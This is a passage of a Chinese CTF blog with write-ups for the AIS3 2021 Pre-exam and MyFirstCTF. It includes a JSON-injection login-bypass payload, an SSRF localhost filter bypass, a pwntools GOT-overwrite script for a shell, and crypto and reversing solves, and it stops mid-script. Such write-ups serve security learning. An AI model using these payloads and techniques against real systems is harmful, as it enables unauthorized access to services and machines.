function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I12tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vh<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g4S<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I13<span class="token function">tRtRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I8tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vw<span class="token function">tRtR</span><span class="token punctuation">(</span><span class="token function">tRg2</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span><span class="token function">g1</span><span class="token punctuation">(</span>g0S<span class="token string">'__getitem__'</span><span class="token function">tR</span><span class="token punctuation">(</span>I7tRS<span class="token string">'__eq__'</span><span class="token function">tR</span><span class="token punctuation">(</span>Vm<span class="token function">tRtR</span><span class="token punctuation">(</span>tRc__builtin__<span class="token function">print</span><span class="token punctuation">(</span>S<span class="token string">'Correct!'</span>tR<span class="token punctuation">.</span></code></pre>    </div></div><p>跑跑看後會需要輸入 flag ，正確的話會跑出 <code>correct!</code></p><blockquote><p>tmi：看這題的時候是第三天早上三點多，不太能思考所以去排版，排起來不是很好看 w 就將就一下吧 XD</p></blockquote><p>打開<code>pkl檔</code>，用<a href="https://github.com/google/google-ctf/blob/master/third_party/edk2/AppPkg/Applications/Python/Python-2.7.2/Lib/pickle.py">pickle opcodes</a>看，先把<code>t</code>換成 <code>)</code> 然後去排版</p><div class="spoiler collapsed">    <div class="spoiler-title">        稍微排版後    </div>    <div class="spoiler-content">        <pre class=" language-cpp="><code class="language-cpp=">c__builtin__input(S'FLAG: ')Rp00c__builtin__getattrp10g1(    (c__builtin__    exit    c__builtin__    s)R    lS'__getitem__')Rp20g2(g1    (g0        S'startswith')R    (S'AIS3{')R)R()Rg2(g1    (g0    S'endswith'    )R    (S'}'    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  6        )R        S'__eq__'    )R    (V  A    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  9        )R        S'__eq__'    )R    (V  j    )R)R()Rg1(g0S'__getitem__')R(I  9)Rp30g2(g1    (g1        (g0        S'__getitem__'        )R        (I11        )R        S'__eq__'    )R    (Vp    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  14        )R        S'__eq__'    )R    (g3    )R)R()Rg1(g0S'__getitem__')R(I  1)Rp40g2(g1    (g1        (g0        S'__getitem__'        )R        (I  5        )R        S'__eq__'    )R    (V  d    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  10        )R        S'__eq__'    )R    (V  z    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  12        )R        S'__eq__'    )R    (V  h    )R)R()Rg2(g1    (g4    S'__eq__'    )R    (g1        (g0        S'__getitem__'        )R        (I  13        )R    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  8        )R        S'__eq__'        )R        (V  w    )R)R()Rg2(g1    (g1        (g0        S'__getitem__'        )R        (I  7        )R        S'__eq__'    )R    (V  m    )R)R()Rc__builtin__print(S'Correct!')R.</code></pre>    </div></div><p>這裡著重的點在<code>__getitem__</code>和<code>__eq__</code><br>從<a href="https://github.com/google/google-ctf/blob/master/third_party/edk2/AppPkg/Applications/Python/Python-2.7.2/Lib/pickle.py">Pickle opcodes</a>寫到</p><pre class=" language-bash"><code class="language-bash">GET <span class="token operator">=</span> <span class="token string">'g'</span>   <span class="token comment" spellcheck="true"># push item from memo on stack; index is string arg</span>INT <span class="token operator">=</span> <span class="token string">'I'</span>   <span class="token comment" spellcheck="true"># push integer or bool; decimal string argument</span>UNICODE <span class="token operator">=</span> <span class="token string">'V'</span>   <span class="token comment" spellcheck="true"># push Unicode string; raw-unicode-escaped'd argument</span></code></pre><p>所以猜是用 stack 的方式去跑，<code>getitem</code>會取 <code>"I"</code> 後面的值 push 進來 stack 裡面，碰到 <code>eq</code> 就會把 V 的值跟 stack 頂端的 index 值做比較，錯誤就結束，所以從最上面開始模擬一次 stack 就可以得到 flag 了</p><div class="spoiler collapsed">    <div class="spoiler-title">        stack    </div>    <div class="spoiler-content">        <pre class=" language-cpp="><code class="language-cpp=">get 6eq 'A'get9eq'j'get9get11eq'p'get14eqget1get5eq'd'get10eq'z'get12eq'h'eqget13get8eq'w'get7eq'm'</code></pre>    </div></div><p>按照 stack 的模式就可以推出 index 對應到的字元了!<br><img src="https://i.imgur.com/m1XC8eB.png"><br>送進去測試之後就會跳出 <code>Correct!</code></p><blockquote><p>flag <code>AIS3{dAmwjzphIj}</code></p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ⲩⲉⲧ-ⲁⲛⲟⲧⲏⲉs-𝓵ⲟ𝓰ⲓⲛ-ⲣⲁ𝓰ⲉ"><a href="#ⲩⲉⲧ-ⲁⲛⲟⲧⲏⲉs-𝓵ⲟ𝓰ⲓⲛ-ⲣⲁ𝓰ⲉ" class="headerlink" title="ⲩⲉⲧ ⲁⲛⲟⲧⲏⲉꞅ 𝓵ⲟ𝓰ⲓⲛ ⲣⲁ𝓰ⲉ"></a>ⲩⲉⲧ ⲁⲛⲟⲧⲏⲉꞅ 𝓵ⲟ𝓰ⲓⲛ ⲣⲁ𝓰ⲉ</h3><p>點開網址後可以看到是一個登入畫面 <img src="https://i.imgur.com/84ofW1R.png" alt="Login"><br>下面有給我們 Source Code <img src="https://i.imgur.com/piuni5f.png" alt="Sauce"></p><p>一開始就亂丟亂試都沒成功，於是花了點時間來看 Source<br>運用<code>JS</code>的特性，<code>users_db</code>的<code>dict</code>如果去取一個不存在的東西會拿到<code>None</code><br>跟<code>null</code>進行 <strong>弱比較</strong> 會是<code>False</code><br>所以可以把<code>password</code>設成<code>null</code><br>再加上<code>JSON</code>後面的會覆蓋掉前面的<br>所以前面塞一些東西，然後<code>password</code>後面再塞一些東西去閉合掉前後的<code>"</code><br>只要保證最後一次<code>username</code>不在<code>users_db</code>內、<code>password</code>是<code>null</code>、<code>showflag</code>是<code>true</code>就可以了</p><p><strong>Payload</strong></p><pre class=" language-js"><code class="language-js">admin<span class="token string">","</span>showflag<span class="token string">":true,"</span>username<span class="token string">":"</span>qqqq<span class="token string">","</span>password<span class="token string">":null,"</span>username<span class="token string">":"</span>aaa</code></pre><blockquote><p>flag <code>AIS3{/r/badUIbattles?!?!}</code></p></blockquote><h3 id="HaaS"><a href="#HaaS" class="headerlink" title="HaaS"></a>HaaS</h3><p>一開始點進去網址看會發現<code>Method Not Allowed</code> <img src="https://i.imgur.com/c5eT2md.png"><br>把<code>/haas</code>拔掉之後就會出現<code>HealthCheck as a Service</code>的網頁 <img src="https://i.imgur.com/Ncu5iH7.png"><br>直接按下送出後會出現<code>Error</code> <img src="https://i.imgur.com/2fB5kXC.png"><br>嘗試改掉<code>status</code>後發現會跳出<code>alive</code> <img src="https://i.imgur.com/q9er00X.png"><br>接著就被卡住了，後來想說是不是之前打CTF的時候出現的<code>SSRF</code>，就去輸入<code>localhost 127.0.0.1</code>，於是跳出了 <img src="https://i.imgur.com/mQf2cPY.png"><br>既然他把我擋掉了，那應該代表要<code>Bypass</code><br>上網查之後查到了<a href="https://ithelp.ithome.com.tw/articles/10242449">用句號代替逗號的方法</a><br><img src="https://i.imgur.com/cWZCnXr.png" alt="ByPass"></p><p>但是直接輸入也不行，又被卡住了<br>後來想說打開<code>BurpSuite</code>能不能看到更多東西<br>所以去研究了一下<a href="https://www.hackercat.org/burp-suite-tutorial/web-pentesting-burp-suite-total-tutorial">BurpSuite的教學文章</a><br>送了幾次網址後在<code>Proxy</code>那邊複製他的格式然後把最底下的 url 改成<code>http://127。0。0。1</code> urlencode後的字串，就可以得到flag了<br><img src="https://i.imgur.com/nZZwUD4.png" alt="Burp"></p><blockquote><p>flag <code>AIS3{V3rY_v3rY_V3ry_345Y_55rF}</code></p></blockquote><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Write-Me-192-賽後"><a href="#Write-Me-192-賽後" class="headerlink" title="Write Me (192) (賽後)"></a>Write Me (192) (賽後)</h3><blockquote><p>[name=Author: lys0829]</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        題目：gotplt.c    </div>    <div class="spoiler-content">        <pre class=" language-Cpp"><code class="language-Cpp">#include <stdlib.h>#include <stdio.h>int main(){    setvbuf(stdin, 0, 2, 0);    setvbuf(stdout, 0, 2, 0);    void *systemgot = 0x404028;    void *scanfgot = 0x404040;    //void *systemgot = (void *)((long long)(*(int *)(systemptr+2))+(long long)(systemptr+6));   *(long long *)systemgot = (long long)0x0;    printf("Address: ");    void *addr;    long long v;    scanf("%ld",&addr);    printf("Value: ");    scanf("%ld",&v);    *(long long *)addr = (long long)v;    *(long long *)scanfgot = (long long)0x0;    printf("OK! Shell for you :)\n");        system("/bin/sh");    return 0;}</code></pre>    </div></div><p>從題目可以看到會在前面把 <code>*systemgot</code> 設為 0x0<br>呼叫 <code>system()</code>的時候會跳到 <code>*systemgot</code>執行，因為前面位址被改掉所以會噴錯<br>執行程式會讓你輸入 unsigned long long *address , unsigned long long value<br>接著把 *address = value<br>我們的目標是把 *systemgot 改回原本的值<br>因此用 gdb 去查看就可以找到了<br><strong>script</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token comment" spellcheck="true">#r = process('./gotplt')</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'quiz.ais3.org'</span><span class="token punctuation">,</span> <span class="token number">10102</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># x/1x 0x404028 ->0x00401050</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x404028</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4210728'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x401050</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4198480'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h2><p>第一次比賽還是很緊張的<br>再加上第一天有 MFC ，第二天有 T 貓決賽<br>於是第二天晚上就果斷不睡稱到比賽結束<br>在結束前十幾分鐘才解出 peekora，真的超刺激<br>Pre-exam 還是挺好玩的！！<br>有任何問題歡迎和我討論~~</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> write-up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write-up </tag>
            
            <tag> AIS3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 MyFirstCTF write-up</title>
      <link href="/2021/05/22/2021-MyFirstCTF-write-up/"/>
      <url>/2021/05/22/2021-MyFirstCTF-write-up/</url>
      
        <content type="html"><![CDATA[<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><table><thead><tr><th>ID</th><th>gunjyo</th></tr></thead><tbody><tr><td>Date</td><td>2021/05/22 09:30 - 17:30</td></tr><tr><td>Rank</td><td>11/282</td></tr><tr><td>Score</td><td>1362</td></tr></tbody></table><p>這是我初次參加(好像也只能參加一次) MyFirstCTF，為期 8 小時。<br>題目會與接續的 AIS3 Pre-exam 些微重疊(因為 AIS3 Pre-exam 的第一天是 MFC~)</p><p>我的排名是第 11 名 ，雖然解的題目不多，對當時的我來說是個還滿滿意的成績~<br>因為是 PR90 以上所以當時有領到獎狀和 AIS3 的帽子 <span class="github-emoji"><span>😍</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span><br><img src="https://i.imgur.com/DVqZFWL.jpg" alt="mfc rank"></p><p>事不遲疑，直接進到 write-up 吧</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cat-Slayer-ᶠᵃᵏᵉ-Nekogoroshi"><a href="#Cat-Slayer-ᶠᵃᵏᵉ-Nekogoroshi" class="headerlink" title="Cat Slayer ᶠᵃᵏᵉ | Nekogoroshi"></a>Cat Slayer ᶠᵃᵏᵉ | Nekogoroshi</h3><p>Welcome 題<br><code>TERM=xterm-256color ssh -p 5566 h173@quiz.ais3.org</code><br>連線後會跳轉到輸入數字密碼的介面，只要按錯一個就會跳 Locked，要重新連線<br>暴力嘗試即可<br>密碼 2025830455298</p><blockquote><p>flag <code>AIS3{H1n4m1z4w4_Sh0k0gun}</code></p></blockquote><blockquote><p>HINT 附上了<a href="https://youtu.be/2b3Oqo13-r0?t=1296">影片</a></p></blockquote><h3 id="祝賀-新垣結衣新婚快樂-發錢囉"><a href="#祝賀-新垣結衣新婚快樂-發錢囉" class="headerlink" title="[祝賀] 新垣結衣新婚快樂 發錢囉"></a>[祝賀] 新垣結衣新婚快樂 發錢囉</h3><p><img src="https://i.imgur.com/6olvo2O.png" alt="題目檔案"><br>下載後觀察到是 png ， <code>foremost</code> 可以看到裡面有 zip檔案<br>需要密碼 但 zip cracker 沒辦法找到<br>猜測是 zip 偽加密，下載 editor 更改後就可以得到 flag 的圖片<br>左邊為原檔 右邊為更改後<br><img src="https://i.imgur.com/Fzu7t14.jpg"><br><img src="https://i.imgur.com/6RiHOwZ.jpg" alt="flag"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Microchip"><a href="#Microchip" class="headerlink" title="Microchip"></a>Microchip</h3><div class="spoiler collapsed">    <div class="spoiler-title">        題目如下    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"python.h"</span></span>def <span class="token function">track</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"4444"</span>                                                      <span class="token function">elif</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"333"</span>                                                       <span class="token function">elif</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"22"</span>                                                        <span class="token function">elif</span> <span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">:</span>        padded <span class="token operator">=</span> name <span class="token operator">+</span> <span class="token string">"1"</span>    keys <span class="token operator">=</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> id    <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>        keys<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>temp <span class="token operator">%</span> <span class="token number">96</span><span class="token punctuation">)</span>        temp <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span>temp <span class="token operator">/</span> <span class="token number">96</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>padded<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">:</span>   #<span class="token number">10</span> round        nums <span class="token operator">=</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">:</span>            num <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span>padded<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span>            num <span class="token operator">=</span> <span class="token punctuation">(</span>num <span class="token operator">+</span> keys<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span>            nums<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span>        result <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        result <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result  #len <span class="token operator">-</span><span class="token operator">></span> <span class="token number">40</span>name <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">strip</span><span class="token punctuation">(</span><span class="token punctuation">)</span>id <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string">"key = "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"result is:"</span><span class="token punctuation">,</span> <span class="token function">track</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span> </code></pre>    </div></div><p>output： <code>=Js&amp;;*A``odZHi\'&gt;D=Js&amp;#i-DYf&gt;Uy\'yuyfyu&lt;)Gu</code></p><p>從題目可以看到只要有 key 就可以用 result 逆推回 flag<br>由 flag 的 format <code>AIS3{}</code> 可以推 key<br>4個而已慢慢用手推即可</p><div class="spoiler collapsed">    <div class="spoiler-title">        推 key    </div>    <div class="spoiler-content">        <p>把 <code>result</code> 推回陣列(如下script)，取前四個數字(6,83,42,29)</p><pre class=" language-cpp"><code class="language-cpp"><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">33</span><span class="token punctuation">(</span> <span class="token number">33</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">69</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">41</span><span class="token punctuation">(</span> <span class="token number">41</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">83</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">42</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'S'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">51</span><span class="token punctuation">(</span> <span class="token number">51</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">42</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">87</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span> <span class="token operator">=</span> <span class="token function">19</span><span class="token punctuation">(</span> <span class="token number">19</span> <span class="token operator">+</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span> <span class="token operator">=</span> <span class="token number">29</span> <span class="token operator">-</span><span class="token operator">></span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span>key<span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">}</span></code></pre>    </div></div><p><strong>script</strong></p><pre class=" language-cpp"><code class="language-cpp">result <span class="token operator">=</span> <span class="token string">'=Js&amp;;*A`odZHi\'>D=Js&amp;#i-DYf>Uy\'yuyfyu&lt;)Gu'</span>n <span class="token operator">=</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token keyword">for</span> j in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>        n<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token macro property">#n = [29, 42, 83, 6, 27, 10, 33, 64, 79, 68, 58, 40, 73, 7, 30, 36, 29, 42, 83, 6, 3, 73, 13, 36, 57, 70, 30, 53, 89, 7, 89, 85, 89, 70, 89, 85, 28, 9, 39, 85]</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>    n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token function">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token macro property">#n = [6, 83, 42, 29, 64, 33, 10, 27, 40, 58, 68, 79, 36, 30, 7, 73, 6, 83, 42, 29, 36, 13, 73, 3, 53, 30, 70, 57, 85, 89, 7, 89, 85, 89, 70, 89, 85, 39, 9, 28]</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">69</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">-</span> key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">96</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>執行 script 後得到<code>AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}22</code> 可以看到 padding 為 22</p><blockquote><p>flag <code>AIS3{w31c0me_t0_AIS3_cryptoO0O0o0Ooo0}</code></p></blockquote><h3 id="Judgement"><a href="#Judgement" class="headerlink" title="Judgement"></a>Judgement</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256<span class="token keyword">import</span> stringflag <span class="token operator">=</span> <span class="token string">'AIS3{THIS_IS_A_FAKE_FLAG}'</span>cand <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'_{}'</span>charset <span class="token operator">=</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">93</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cand<span class="token punctuation">)</span>enc <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> c <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> cand<span class="token punctuation">)</span>    enc  <span class="token operator">+=</span> charset<span class="token punctuation">[</span>int<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>c<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>charset<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span></code></pre><p>output：<code>)g;Fk@&gt;2g;2V2J?d5G3_8V2&lt;dR2i5GZ@&lt;?2)g\j_2V&amp;?2;@[F@ek2_3"=k&amp;;2)\F2J9LL4g[W2"[2&lt;)RZ23@&lt;?2elFZ?2=@jZ23@=F2Yi52;lL5Vj2J?2J8\e@eW23e2lF330</code></p><p>很直覺的想法是把所有<code>cand</code>裡面的字元都跑一次+比對，但因為有多個字元會跑出同一個結果，所以我把每個結果的可能性都<code>print</code>出來用人工比對<br><strong>script</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256<span class="token keyword">import</span> stringenc <span class="token operator">=</span> <span class="token 